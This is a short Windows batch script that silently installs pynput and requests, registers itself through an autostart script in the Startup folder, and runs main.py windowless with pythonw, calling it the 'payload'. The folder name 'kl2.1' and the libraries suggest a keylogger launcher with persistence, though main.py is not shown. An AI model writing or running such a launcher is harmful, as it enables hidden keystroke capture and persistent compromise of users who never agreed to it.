@echo off

cd C:\users\%USERNAME%\kl2.1

pip install requests
pip install pynput

:: Run autostart.bat to add run.bat to Startup
call autostart.bat

pythonw main.py
if %errorlevel% neq 0 (
    echo Error occurred while running payload.
)

exit
